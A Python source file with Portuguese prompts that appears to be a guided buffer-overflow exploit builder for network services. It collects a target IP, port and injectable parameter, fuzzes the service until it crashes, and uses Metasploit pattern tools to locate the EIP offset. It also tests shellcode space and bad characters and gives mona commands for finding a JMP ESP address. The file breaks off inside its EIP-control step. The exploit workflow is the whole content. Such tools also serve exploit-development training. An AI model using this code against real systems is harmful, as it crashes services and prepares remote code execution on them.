#!/usr/bin/env python3
# DESENVOLVIDO POR DANIEL DOMINGUES GALDINO DA SILVA

import socket
import os
import struct
from time import sleep
import ipaddress
import math

################################################### FUNÇÕES ESTÉTICAS ###################################################

def clear():  # FUNÇÃO PARA LIMPAR A TELA
    _ = os.system("clear")
# =======================================================================================================================

def divisao():  # FUNÇÃO PARA DIVISÕES NA TELA
    print(f"\n================================================================================\n")
# =======================================================================================================================

def titulo(_TITLE):  # FUNÇÃO PARA EXIBIR OS TÍTULOS DAS TELAS
    _EQUAL = "=" * math.trunc((120 - len(_TITLE)) / 2)
    if len(_EQUAL + _TITLE + _EQUAL) == 119:
        print(f"{_GREEN}{_EQUAL}{_RED}{_TITLE}{_GREEN}={_EQUAL}{_DEFAULT_COLOR}\n")
    else:
        print(f"{_GREEN}{_EQUAL}{_RED}{_TITLE}{_GREEN}{_EQUAL}{_DEFAULT_COLOR}\n")
########################################################################################################################

def pergunta(_MSG):  # FUNÇÃO PARA DAR OPÇÃO DE RESTARTAR O MÓDULO OU VOLTAR AO MENU
    divisao()
    print(_MSG)
    divisao()
    if input(f"{_YELLOW}PRESSIONE {_GREEN}ENTER{_YELLOW} PARA TENTAR NOVAMENTE OU DIGITE {_GREEN}MENU{_YELLOW} PARA RETORNAR AO MENU PRINCIPAL: {_DEFAULT_COLOR}").upper() == "MENU":
        return "MENU"
# =======================================================================================================================

def define_parametros():    # FUNÇÃO PARA ENTRADA DOS PARAMETROS DO ALVO
    global _HOST, _PORT, _PARAMETERS, _EXPL_PARAMETER, _BANNER, _TIMEOUT

    print(f"{_YELLOW}ENTRE COM OS {_RED}PARÂMETROS{_YELLOW} DO ALVO!{_DEFAULT_COLOR}")

    # IP DO ALVO
    while True:
        _HOST = input(f"{_YELLOW}DIGITE O {_RED}IP{_YELLOW} DA MÁQUINA {_RED}ALVO{_YELLOW}: {_DEFAULT_COLOR}")
        try:
            ipaddress.ip_address(_HOST)  # TESTA SE VALOR DIGITADO É REALMENTE UM IP
            break
        except Exception:
            print(f"{_RED}[!] IP inválido! Digite o IP corretamente!{_DEFAULT_COLOR}")

    # PORTA DO ALVO
    while True:
        _PORT = input(f"{_YELLOW}DIGITE A {_RED}PORTA{_YELLOW} DA MÁQUINA {_RED}ALVO{_YELLOW} ({_RED}1 {_YELLOW}A {_RED}65535{_YELLOW}): {_DEFAULT_COLOR}")
        if _PORT.isnumeric() and 1 <= int(_PORT) <= 65535:
            _PORT=int(_PORT)
            break

    # VERIFICAR QUANTOS E QUAIS PARÂMETROS SERÃO ENVIADOS À APLICAÇÃO ALVO
    while True:
        _NUMBER_PARAMETERS_ = input(f"{_RED}QUANTOS PARÂMETROS{_YELLOW} SERÃO ENVIADOS PARA A APLICAÇÃO? {_DEFAULT_COLOR}").upper()
        if _NUMBER_PARAMETERS_.isnumeric() and int(_NUMBER_PARAMETERS_) > 0:
            _NUMBER_PARAMETERS_ = int(_NUMBER_PARAMETERS_)
            divisao()
            break
    
    print(f"{_YELLOW}DIGITE OS {_RED}PARÂMETROS {_YELLOW}SEGUIDOS DE {_GREEN}ENTER{_YELLOW}:{_DEFAULT_COLOR}")
    _PARAMETERS.clear()
    for _PARAMETER_ in range(_NUMBER_PARAMETERS_):
        _PARAMETERS.append(input(f"{_YELLOW}PARÂMETRO {_RED}{int(_PARAMETER_) + 1}{_YELLOW}: {_DEFAULT_COLOR}"))
    
    # SELECIONAR O PARÂMETRO EXPLOITÁVEL
    divisao()
    print(f"{_YELLOW}PARÂMETROS:{_DEFAULT_COLOR}")
    _COUNT_ = 0
    for _PARAMETER_ in _PARAMETERS:
        _COUNT_ = _COUNT_ + 1
        print(f"{_YELLOW}[{_RED}{_COUNT_}{_YELLOW}] {_PARAMETER_}{_DEFAULT_COLOR}")
        
    while True:
        _OPTION_ = input(f"{_YELLOW}QUAL SERÁ O PARÂMETRO {_RED}EXPLOITÁVEL?{_YELLOW} ({_RED}1 {_YELLOW}A {_RED}{_COUNT_}{_YELLOW}): {_DEFAULT_COLOR}")
        if _OPTION_.isnumeric() and 1 <= int(_OPTION_) <= _COUNT_:
            _EXPL_PARAMETER = _PARAMETERS[int(_OPTION_) - 1]
            print(f"{_YELLOW}PARÂMETRO EXPLOITÁVEL: {_RED}{_EXPL_PARAMETER}{_DEFAULT_COLOR}")
            divisao()
            break

    while True:
        _BANNER = input(f"{_YELLOW}AGUARDAR RESPOSTA DA CONEXÃO (BANNER APÓS A CONEXÃO AO SERVIÇO)? ({_GREEN}S{_YELLOW}/{_RED}N{_YELLOW}): {_DEFAULT_COLOR}").upper()
        if _BANNER == "S":
            while True:
                _TIMEOUT = input(f"{_YELLOW}QUANTOS {_RED}SEGUNDOS{_YELLOW} A CONEXÃO DEVERÁ AGUARDAR A RESPOSTA? {_DEFAULT_COLOR}")
                if _TIMEOUT.isnumeric() and int(_TIMEOUT) >= 1:
                    _TIMEOUT = int(_TIMEOUT)
                    break
            break
        if _BANNER == "N":
            break
# =======================================================================================================================

def exibe_parametros():     # FUNÇÃO PARA EXIBIÇÃO DOS PARAMETROS DO ALVO
    global _HOST, _PORT, _PARAMETERS, _EXPL_PARAMETER, _BANNER, _TIMEOUT

    print(f"{_RED}IP{_YELLOW} DA MÁQUINA {_RED}ALVO{_YELLOW}: {_HOST}{_DEFAULT_COLOR}")
    print(f"{_RED}PORTA{_YELLOW} DA MÁQUINA {_RED}ALVO{_YELLOW}: {_PORT}{_DEFAULT_COLOR}")
    print(f"{_YELLOW}PARÂMETROS:{_DEFAULT_COLOR}")
    _COUNT_ = 0
    for _PARAMETER_ in _PARAMETERS:
        _COUNT_ = _COUNT_ + 1
        if _PARAMETER_ == _EXPL_PARAMETER:
            print(f"    [{_GREEN}{_COUNT_}{_DEFAULT_COLOR}] {_PARAMETER_} - {_RED}EXPLOITÁVEL{_DEFAULT_COLOR}")    
        else:
            print(f"    [{_GREEN}{_COUNT_}{_DEFAULT_COLOR}] {_PARAMETER_}{_DEFAULT_COLOR}")
    if _BANNER == "S":
        print(f"{_GREEN}AGUARDAR {_TIMEOUT} SEGUNDOS {_YELLOW} PELA RESPOSTA DA CONEXÃO (BANNER APÓS A CONEXÃO AO SERVIÇO){_DEFAULT_COLOR}")
    else:
        print(f"{_RED}NÃO AGUARDAR{_YELLOW} RESPOSTA DA CONEXÃO (BANNER APÓS A CONEXÃO AO SERVIÇO){_DEFAULT_COLOR}")
# =======================================================================================================================

def conecta():  # FUNÇÃO PARA CONEXÃO COM O ALVO
    global _BANNER, _CONN, _HOST, _PORT

    _CONN = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    _CONN.settimeout(_TIMEOUT)
    try:
        _CONN.connect((_HOST, _PORT))
        if _BANNER == "S":
            _ANSWER = _CONN.recv(1024)
        return 0
    except Exception as erro:
        print(erro)
        return pergunta(f"{_RED}OCORREU UM PROBLEMA DE CONEXÃO COM O ALVO!{_DEFAULT_COLOR}")
# =======================================================================================================================

def envia(_STRING_): # FUNÇÃO PARA ENVIO DOS PACOTES PARA O ALVO
    global _PARAMETERS, _EXPL_PARAMETER, _CONN, _BANNER
    _CONN.settimeout(_TIMEOUT)

    for _PARAMETER_ in _PARAMETERS:
        print(f"\nParameter: {_PARAMETER_}. Tipo: {type(_PARAMETER_)}")
        print(f"Expl Parameter: {_EXPL_PARAMETER}. Tipo: {type(_EXPL_PARAMETER)}")
        if _PARAMETER_ == _EXPL_PARAMETER:
            _BUFFER_ = _PARAMETER_ + " " + _STRING_
            _CONN.send((_BUFFER_ + '\r\n').encode('latin-1'))
            print((_BUFFER_ + '\r\n').encode('latin-1'))
        else:
            _CONN.send((_PARAMETER_ + ' anonymous\r\n').encode('latin-1'))
            print((_PARAMETER_ + ' anonymous\r\n').encode('latin-1'))
        
        sleep(1)
        if _BANNER == 'S':
            _ANSWER = _CONN.recv(1024)
            print(f"Recebeu resposta: {_ANSWER}\n")
# =======================================================================================================================

def define_eip(_TYPE_):    # FUNÇÃO PARA VERIFICAR ENDEREÇO DE EIP OU JMP ESP DIGITADO
    while True:
        _ADDRESS_ = input(f"{_YELLOW}DIGITE O VALOR DO {_RED}{_TYPE_}{_YELLOW}: {_DEFAULT_COLOR}")
        if len(_ADDRESS_) == 8:
            for _INDEX_ in range(len(_ADDRESS_)):
                if _ADDRESS_[_INDEX_] not in "1234567890abcdefABCDEF":
                    break
            if _ADDRESS_[_INDEX_] in "1234567890abcdefABCDEF":
                break
            else:
                print(f"{_RED}O {_TYPE_} deve conter algarismos {_GREEN}Hexadecimais{_RED} ({_GREEN}0-9{_RED} e {_GREEN}a-f{_RED})!{_DEFAULT_COLOR}")
                divisao()
        else:
            print(f"{_RED}O {_TYPE_} deve conter {_GREEN}8 dígitos{_RED}!{_DEFAULT_COLOR}")
            divisao()
    print("return")
    print(_ADDRESS_)
    return(_ADDRESS_)
# =======================================================================================================================

def define_jmp():    # FUNÇÃO PARA DEFINIR O JMP ESP
    global _JUMP
    divisao()
    print(f"{_YELLOW}PROCURE UMA INSTRUÇÃO RELACIONADA AO {_RED}ESP{_YELLOW} NOS MÓDULOS CARREGADOS PELO EXECUTÁVEL{_DEFAULT_COLOR}")
    print(f"{_RED}\nMÉTODO [1]{_YELLOW} - NO {_RED}IMMUNITY DEBUGGER{_YELLOW}, DIGITE {_GREEN}CRTL+F{_YELLOW}. EM SEGUIDA, DIGITE {_GREEN}ALT+L{_DEFAULT_COLOR}")
    print(f"{_RED}\nMÉTODO [2]{_YELLOW} - NO CONSOLE DO {_RED}IMMUNITY DEBUGGER{_YELLOW}, DIGITE {_GREEN}!mona jmp -r ESP{_YELLOW}. EM SEGUIDA, DIGITE {_GREEN}JMP ESP{_YELLOW} E PRESSIONE ENTER{_DEFAULT_COLOR}")
    print(f"{_RED}\nMÉTODO [3]{_YELLOW} - NO CONSOLE DO {_RED}IMMUNITY DEBUGGER{_YELLOW}, DIGITE {_GREEN}!mona modules{_YELLOW}. VERIFIQUE OS MÓDULOS RELACIONADOS À APLICAÇÃO ALVO.{_DEFAULT_COLOR} ", end="")
    print(f"{_YELLOW}EM SEGUIDA, DIGITE {_GREEN}!mona find -s", end="")
    print(r' "\xff\xe4"', end="")
    print(f" -m MÓDULO{_DEFAULT_COLOR}")
    divisao()
    _JUMP = define_eip("JMP ESP")
# =======================================================================================================================

def define_ruptura(_TYPE_):
    global _BYTES_OVERFLOW, _CRASH, _SHELLCODE_SIZE

    if _TYPE_ == "_SHELLCODE_SIZE":     # CHAMADO PELA FUNÇÃO controle()
        while True:
            _SHELLCODE_SIZE = input(f"{_YELLOW}DIGITE O {_RED}TAMANHO DO SHELLCODE{_YELLOW} (EM BYTES): {_DEFAULT_COLOR}")
            if _SHELLCODE_SIZE.isnumeric():
                _SHELLCODE_SIZE = int(_SHELLCODE_SIZE)
                break
            else:
                print(f"{_RED}[!] O TAMNAHO DO SHELLCODE DEVE SER MAIOR QUE O VALOR DE SOBRESCRITA DO EIP ({_YELLOW}{_EIP_VALUE}{_RED})\n")

    if _TYPE_ == "_BUFFER_OVERFLOW":     # CHAMADO PELA FUNÇÃO eip()
        while True:
            _BYTES_OVERFLOW = input(f"{_YELLOW}AINDA NÃO FOI DEFINIDO O PONTO DE RUPTURA! DIGITE O {_RED}VALOR EXATO{_YELLOW} QUE TRAVA A APLICAÇÃO: {_DEFAULT_COLOR}")
            if _BYTES_OVERFLOW.isnumeric():
                _BYTES_OVERFLOW=int(_BYTES_OVERFLOW)
                divisao()
                break

    if _TYPE_ == "CRASH":    # CHAMADO PELA FUNÇÃO ruptura()
        while True:
            _CRASH = input(f"{_YELLOW}AINDA NÃO FOI DEFINIDA O TAMANHO DA {_RED}STRING PARA TRAVAR A APLICAÇÃO{_YELLOW}! QUAL O TAMANHO DESEJA UTILIZAR? {_DEFAULT_COLOR}")
            if _CRASH.isnumeric():
                _CRASH=int(_CRASH)
                divisao()
                break
# =======================================================================================================================

def fuzzy():    # FUNÇÃO PARA REALIZAR O FUZZY (DEFINE UM VALOR QUE PODE TRAVAR A APLICAÇÃO)
    clear()
    titulo("TESTE INCREMENTAL DE STRING (FUZZY)")
    global _CRASH, _CONN

    # VERIFICA SE OS DADOS DO ALVO JÁ FORAM DIGITADOS
    if _HOST == "" or _PORT == 0: define_parametros()
    else:
        exibe_parametros()
        while True:
            _OPTION_ = input(f"\n{_YELLOW}DESEJA MANTER OS DADOS ACIMA? ({_GREEN}S{_YELLOW}/{_RED}N{_YELLOW}) {_DEFAULT_COLOR}").upper()
            divisao()
            if _OPTION_ == "S":
                break
            if _OPTION_ == "N":
                define_parametros()
                break

    # DEFINE O VALOR DO INCREMENTO
    while True:
        _INCR_ = input(f"{_YELLOW}AGORA DIGITE O VALOR DO {_RED}INCREMENTO{_YELLOW}: {_DEFAULT_COLOR}")
        if _INCR_.isnumeric() and 1 <= int(_INCR_) >= 1:
            _INCR_ = int(_INCR_)
            break
        print(f"{_RED}[!] Valor inválido! Digite valores numéricos!{_DEFAULT_COLOR}")

    # DEFINE A QUANTIDADE DE REPETIÇÕES
    while True:
        _LOOP_ = input(f"{_YELLOW}DIGITE TAMBÉM A QUANTIDADE DE {_RED}REPETIÇÕES{_YELLOW}: {_DEFAULT_COLOR}")
        if _LOOP_.isnumeric() and 1 <= int(_LOOP_) >= 1:
            _LOOP_ = int(_LOOP_)
            break
        print(f"{_RED}[!] Valor inválido! Digite valores numéricos!{_DEFAULT_COLOR}")

    divisao()

    # CRIA UMA LISTA COM A QUANTIDADE DE REPETIÇÕES E O INCREMENTO DIGITADOS
    _COUNT_ = _INCR_
    #_BUFFER = [b"A" * _INCR_]
    _BUFFER = ["A" * _INCR_]
    while len(_BUFFER) < _LOOP_:
        _INCR_ = _INCR_ + _COUNT_
        #_BUFFER.append(b"A" * _INCR_)
        _BUFFER.append("A" * _INCR_)

    input(f"{_YELLOW}INICIE A APLICAÇÃO E PRESSIONE {_GREEN}ENTER{_YELLOW} PARA CONTINUAR...{_DEFAULT_COLOR}")
    divisao()

    # ENVIA AS STRINGS, UMA POR VEZ, ATÉ O CRASH DA APLICAÇÃO OU FIM DO ARRAY
    for _STRING_ in _BUFFER:
        _CRASH = len(_STRING_)               # VARIÁVEL PARA SER UTILIZADA COMO TAMANHO DO PATTERN DA FUNÇÃO RUPTURA()
        _CONNECTION_ = conecta()
        if _CONNECTION_ == 0:
            try:
                print(f"Enviando string com {len(_STRING_)} bytes")
                envia(_STRING_)
                _CONN.close()
                _SENT = 1                   # VARIÁVEL DEFINIDA PARA, CASO O ÚLTIMO ENVIO TENHA RECEBIDO UMA RESPOSTA MAS CRASHADO O ALVO, A PRÓXIMA TENTATIVA DE CONEXÃO SERÁ CONSIDERADA SUCESSO PARA CAIR NESTE LAÇO NOVAMENTE E DAR UM ERRO
            except Exception as erro:               # CASO A APLICAÇÃO CRASH, OCORRE TIMEOUT NO MÉTODO SEND E O FLUXO VEM PARA O TRATAMENTO DA EXCEÇÃO
                print(f"Erro envia(): {erro}")
                divisao()
                print(f"{_GREEN}APLICAÇÃO CRASHOU COM {_RED}{_CRASH} BYTES{_GREEN}!{_DEFAULT_COLOR}")

                while True:
                    divisao()
                    _QUESTION = input(f"{_RED}ATENÇÃO!!! {_YELLOW}O REGISTRADOR {_RED}EIP{_YELLOW} ESTÁ PREENCHIDO COM OS VALORES {_RED}41414141{_YELLOW}? ({_GREEN}S{_YELLOW}/{_RED}N{_YELLOW}) {_DEFAULT_COLOR}").upper()
                    if _QUESTION == "S":
                        return "MENU"
                    if _QUESTION == "N":    # CASO EIP NÃO SEJA SOBRESCRITO, A FUNÇÃO REINICIA
                        _CRASH = ""
                        return pergunta(f"{_YELLOW}TENTE UMA COMBINAÇÃO DE {_GREEN}INCREMENTO{_YELLOW} E {_GREEN}REPETIÇÕES{_DEFAULT_COLOR}")

                input(f"{_YELLOW}PRESSIONE {_GREEN}ENTER{_YELLOW} PARA RETORNAR AO MENU...{_DEFAULT_COLOR}")
                return "MENU"
        else:
            return _CONNECTION_

    # SE O FLUXO CHEGAR AQUI É PORQUE NÃO CRASHOU A APLICAÇÃO
    return pergunta(f"{_RED}[!] A APLICAÇÃO NÃO CRASHOU!\n\n{_YELLOW}TENTE UM {_GREEN}INCREMENTO{_YELLOW} OU UM {_GREEN}NÚMERO DE REPETIÇÕES{_YELLOW} MAIOR!")
# =======================================================================================================================

def ruptura():  # FUNÇÃO QUE DEFINE O TAMANHO EXATO DA STRING QUE TRAVA A APLICAÇÃO
    clear()
    titulo("VERIFICAÇÃO DO PONTO DE RUPTURA")
    global _CRASH, _BYTES_OVERFLOW, _CONN

    # VERIFICA SE OS DADOS DO ALVO JÁ FORAM DIGITADOS
    if _HOST == "" or _PORT == 0: define_parametros()
    else: exibe_parametros()
    divisao()

    if _CRASH == 0: define_ruptura("CRASH")

    input(f"{_YELLOW}INICIE A APLICAÇÃO E PRESSIONE {_GREEN}ENTER{_YELLOW} PARA CONTINUAR...{_DEFAULT_COLOR}")
    divisao()
    print(f"Gerando string de caracteres Únicos com {str(_CRASH)} bytes\n")
    print(f"/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {str(_CRASH)}\n")
    _STRING_ = os.popen("/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l " + str(_CRASH)).read()
    _STRING_ = _STRING_[:-1]
    
    _CONNECTION_ = conecta()
    if _CONNECTION_ == 0:
        print(_STRING_)
        try:
            envia(_STRING_)
            _CONN.close()
            divisao()
        except Exception:
            _EIP_VALUE_CRASH_ = define_eip("EIP")  # REFERE-SE AO VALOR DO EIP QUANDO É MANDADA A STRING ÚNICA E NÃO TEM RELAÇÃO COM A VARIAVEL GLOBAL _EIP_VALUE
            divisao()
            print("Calculando o valor do ponto de ruptura...\n")
            print(f"/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l {_CRASH} -q {_EIP_VALUE_CRASH_}\n")
            _UNIQUE_STRING_ = os.popen("/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l " + str(_CRASH) + " -q " + _EIP_VALUE_CRASH_).read()

            # TESTE PARA VERIFICAR SE FOI ENCONTRADO O PONTO DE RUPTURA
            if _UNIQUE_STRING_ != "":
                _UNIQUE_STRING_ = _UNIQUE_STRING_.split()
                if _UNIQUE_STRING_[len(_UNIQUE_STRING_) - 1].isnumeric():
                    divisao()
                    _BYTES_OVERFLOW = _UNIQUE_STRING_[len(_UNIQUE_STRING_) - 1]
                    _BYTES_OVERFLOW = int(_BYTES_OVERFLOW)
                    print(f"{_YELLOW}O VALOR DE RUPTURA FOI DE {_GREEN}{_BYTES_OVERFLOW} BYTES{_YELLOW}!{_DEFAULT_COLOR}")
                    input(f"{_YELLOW}\nPRESSIONE {_GREEN}ENTER{_YELLOW} PARA RETORNAR AO MENU...{_DEFAULT_COLOR}")
                    return "MENU"
            else:
                return pergunta(f"{_RED}[!] VALOR NÃO CORRESPONDE A NENHUMA POSIÇÃO! VERIFIQUE SE O {_YELLOW}EIP{_RED} FOI DIGITADO CORRETAMENTE!{_DEFAULT_COLOR}")
    else:
        return _CONNECTION_
    # CASO O TAMANHO DA STRING NÃO ESTOURE O BUFFER, CAI AQUI
    return pergunta(f"{_RED}[!] A APLICAÇÃO NÃO CRASHOU! VERIFIQUE O TAMANHO DA STRING ENVIADA!{_DEFAULT_COLOR}")
# ======================================================================================================================

def eip():  # CALCULA A QUANTIDADE EXATA DE BYTES PARA SOBRESCREVER O EIP
    clear()
    titulo("VERIFICAÇÃO DE SOBRESCRITA DO EIP")
    global _BYTES_OVERFLOW, _EIP_VALUE, _CONN

    # VERIFICA SE OS DADOS DO ALVO JÁ FORAM DIGITADOS
    if _HOST == "" or _PORT == 0: define_parametros()
    else: exibe_parametros()
    divisao()

    if _BYTES_OVERFLOW == 0 : define_ruptura("_BUFFER_OVERFLOW")

    input(f"{_YELLOW}INICIE A APLICAÇÃO E PRESSIONE {_GREEN}ENTER{_YELLOW} PARA CONTINUAR...{_DEFAULT_COLOR}")
    divisao()

    _STRING_ = "A" * _BYTES_OVERFLOW + "B" * 4
    print("Enviando string para sobrescrita do EIP...\n")
    print(_STRING_)
    #_STRING_ = str(_STRING_).encode()

    _CONNECTION_ = conecta()
    if _CONNECTION_ == 0:
        try:
            envia(_STRING_)
            _CONN.close()
            divisao()
        except Exception:
            while True:
                _QUESTION_ = input(f"{_YELLOW}VERIFICQUE SE O {_RED}EIP{_YELLOW} DA APLICAÇÃO FOI SOBRESCRITO COM {_RED}42424242{_YELLOW}: ({_GREEN}S{_YELLOW}/{_RED}N{_YELLOW}) {_DEFAULT_COLOR}").upper()
                divisao()
                if _QUESTION_ == "S":
                    print(f"{_GREEN}OK! O VALOR EXATO NECESSÁRIO PARA SOBRESCREVER O EIP É DE {_RED}{_BYTES_OVERFLOW + 4} BYTES{_DEFAULT_COLOR}")
                    _EIP_VALUE = _BYTES_OVERFLOW + 4
                    divisao()
                    input(f"{_YELLOW}PRESSIONE {_GREEN}ENTER{_YELLOW} PARA RETORNAR AO MENU...{_DEFAULT_COLOR}")
                    return "MENU"
                if _QUESTION_ == "N":
                    return pergunta(f"{_RED}[!] VERIFIQUE SE O TAMANHO DA STRING PARA SOBRESCREVER O EIP ESTÁ CORRETA!!{_DEFAULT_COLOR}")
    else:
        return _CONNECTION_
    # CASO O TAMANHO DA STRING NÃO ESTOURE O BUFFER, CAI AQUI
    return pergunta(f"{_RED}[!] A APLICAÇÃO NÃO CRASHOU! VERIFIQUE O TAMANHO DA STRING ENVIADA!{_DEFAULT_COLOR}")
# =======================================================================================================================

def espaco():
    clear()
    titulo("VERIFICANDO ESPAÇO PARA O SHELLCODE")
    global _BYTES_OVERFLOW, _EIP_VALUE, _CONN, _SHELLCODE_SIZE

    # VERIFICA SE OS DADOS DO ALVO JÁ FORAM DIGITADOS
    if _HOST == "" or _PORT == "": define_parametros()
    else: exibe_parametros()
    divisao()
    
    if _BYTES_OVERFLOW == 0:
        define_ruptura("_BUFFER_OVERFLOW")
        _EIP_VALUE = _BYTES_OVERFLOW + 4

    define_ruptura("_SHELLCODE_SIZE")    

    input(f"{_YELLOW}INICIE A APLICAÇÃO E PRESSIONE {_GREEN}ENTER{_YELLOW} PARA CONTINUAR...{_DEFAULT_COLOR}")
    divisao()

    _STRING_ = "A" * _BYTES_OVERFLOW + "B" * 4 + "C" * (_SHELLCODE_SIZE - 4) + "D" * 4
    print(f"Enviando string com {_SHELLCODE_SIZE} bytes 'C' e 4 bytes 'D' após a posição do EIP...\n")
    print(_STRING_)
    #_STRING_ = str(_STRING_).encode()

    _CONNECTION_ = conecta()
    if _CONNECTION_ == 0:
        try:
            envia(_STRING_)
            _CONN.close()
            divisao()
        except Exception:
            while True:
                _QUESTION_ = input(f"{_RED}ATENÇÃO!!! {_YELLOW}VERIFICQUE SE FORAM O {_RED}EIP{_YELLOW} ESTÁ SOBRESCRITO COM {_RED}42424242{_YELLOW} E SE FORAM IMPRESSOS OS BYTES {_RED}{_SHELLCODE_SIZE} 'C'{_YELLOW} E OS {_RED}4 'D'{_YELLOW} NO ESP: ({_GREEN}S{_YELLOW}/{_RED}N{_YELLOW}) {_DEFAULT_COLOR}").upper()
                if _QUESTION_ == "S":
                    divisao()
                    print(f"{_GREEN}OK! HÁ ESPAÇO PARA O SHELLCODE!!{_DEFAULT_COLOR}")
                    _EIP_VALUE = _BYTES_OVERFLOW + 4
                    divisao()
                    input(f"{_YELLOW}PRESSIONE {_GREEN}ENTER{_YELLOW} PARA RETORNAR AO MENU...{_DEFAULT_COLOR}")
                    return "MENU"
                if _QUESTION_ == "N":
                    return pergunta(f"{_RED}[!] VERIFIQUE OS PARÂMETROS DE ENTRADA!!{_DEFAULT_COLOR}")
    else:
        return _CONNECTION_
    # CASO O TAMANHO DA STRING NÃO ESTOURE O BUFFER, CAI AQUI
    return pergunta(f"{_RED}[!] A APLICAÇÃO NÃO CRASHOU! VERIFIQUE O TAMANHO DA STRING ENVIADA!{_DEFAULT_COLOR}")
# =======================================================================================================================

def badchar():  # FUNÇÃO PARA TESTAR OS BAD CHARS E TIRA-LOS DO PAYLOAD FUTURAMENTE
    clear()
    titulo("TESTE DE BAD CHARS")
    global _BYTES_OVERFLOW, _BAD_CHARS, _EIP_VALUE

    # VERIFICA SE OS DADOS DO ALVO JÁ FORAM DIGITADOS
    if _HOST == "" or _PORT == "": define_parametros()
    else: exibe_parametros()
    divisao()

    if _BYTES_OVERFLOW == 0:
        define_ruptura("_BUFFER_OVERFLOW")
        _EIP_VALUE = _BYTES_OVERFLOW + 4

    _STRING_BADCHARS_RAW_ = r'"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"'
    input(f"{_YELLOW}INICIE A APLICAÇÃO E PRESSIONE {_GREEN}ENTER{_YELLOW} PARA CONTINUAR...{_DEFAULT_COLOR}")
    divisao()

    while True:
        clear()
        titulo("TESTE DE BAD CHARS")
        _STRING_BADCHARS_ = _STRING_BADCHARS_RAW_.encode().decode('unicode-escape')
        _STRING_ = "A" * _BYTES_OVERFLOW + "B" * 4 + _STRING_BADCHARS_
        print("Enviando a string para o alvo com os BAD CHARS abaixo:\n")
        print((_STRING_).encode('utf-8'))

        _CONNECTION_ = conecta()
        if _CONNECTION_ == 0:
            try:
                envia(_STRING_)
                _CONN.close()
                divisao()
            except Exception:
                divisao()
                print(f"{_YELLOW}PROCURE A STRING SEQUENCIAL LOGO APÓS A SEQUÊNCIA DE BYTES {_RED}42{_YELLOW}!{_DEFAULT_COLOR}")
                print(f"{_YELLOW}CASO A SEQUÊNCIA SEJA QUEBRADA, DIGITE O CHAR NA LINHA ABAIXO, UM POR VEZ!\n{_DEFAULT_COLOR}")
                print(f"{_YELLOW}LISTA DE BAD CHARS: {_GREEN}{_BAD_CHARS}{_DEFAULT_COLOR}")
                _CHAR_ = input(f"{_YELLOW}DIGITE O {_GREEN}BAD CHAR QUE CRASHOU{_YELLOW} OU {_GREEN}MENU{_YELLOW} PARA CONCLUIR A LISTA DE BAD CHARS ({_GREEN}FORMATO \\x00{_YELLOW}): {_DEFAULT_COLOR}").lower()
                if _CHAR_.upper() == "MENU":
                    divisao()
                    print(f"{_GREEN}LISTA DE BAD CHARS: {_GREEN}{_BAD_CHARS}{_DEFAULT_COLOR}")
                    divisao()
                    input(f"{_YELLOW}PRESSIONE {_GREEN}ENTER{_YELLOW} PARA RETORNAR AO MENU...{_DEFAULT_COLOR}")
                    return "MENU"
                if str((_STRING_BADCHARS_RAW_.encode('utf-8'))).find(_CHAR_) != -1:     
                    _STRING_BADCHARS_RAW_ = _STRING_BADCHARS_RAW_.replace(_CHAR_.lower(), "") # APAGA O CHAR DIGITADO PELO USUÁRIO NA STRING DE BADCHARS
                    _BAD_CHARS += _CHAR_    # ADICIONA O CHAR DIGITADO NA LISTA DE BADCHARS QUE IRÁ SER UTILIZADA NO MSFVENOM
                else:
                    divisao()
                    print(f"{_RED}CHAR NÃO RECONHECIDO OU JÁ ADICIONADO A LISTA DOS BAD CHARS{_DEFAULT_COLOR}")
                divisao()
                input(f"{_GREEN}REINICIE A APLICAÇÃO{_YELLOW} ALVO E PREESIONE {_GREEN}ENTER{_YELLOW} PARA REENVIAR OS BAD CHARS...{_DEFAULT_COLOR}")
            else:
                return pergunta(f"{_RED}OCORREU ALGUM PROBLEMA DURANTE O ENVIO DOS BAD CHARS{_DEFAULT_COLOR}")
        else:
            return _CONNECTION_
    # CASO O TAMANHO DA STRING NÃO ESTOURE O BUFFER, CAI AQUI
    return pergunta(f"{_RED}[!] A APLICAÇÃO NÃO CRASHOU! VERIFIQUE O TAMANHO DA STRING ENVIADA!{_DEFAULT_COLOR}")
# =======================================================================================================================

def controle():
    clear()
    titulo("VERIFICANDO O CONTROLE DO EIP")
    global _EXPL_PARAMETER, _BYTES_OVERFLOW, _EIP_VALUE, _JUMP, _EIP_CONTROL, _CONN, _SHELLCODE_SIZE

    # VERIFICA SE OS DADOS DO ALVO JÁ FORAM DIGITADOS
    if _HOST == "" or _PORT == "": define_parametros()
    else: exibe_parametros()
    divisao()
    
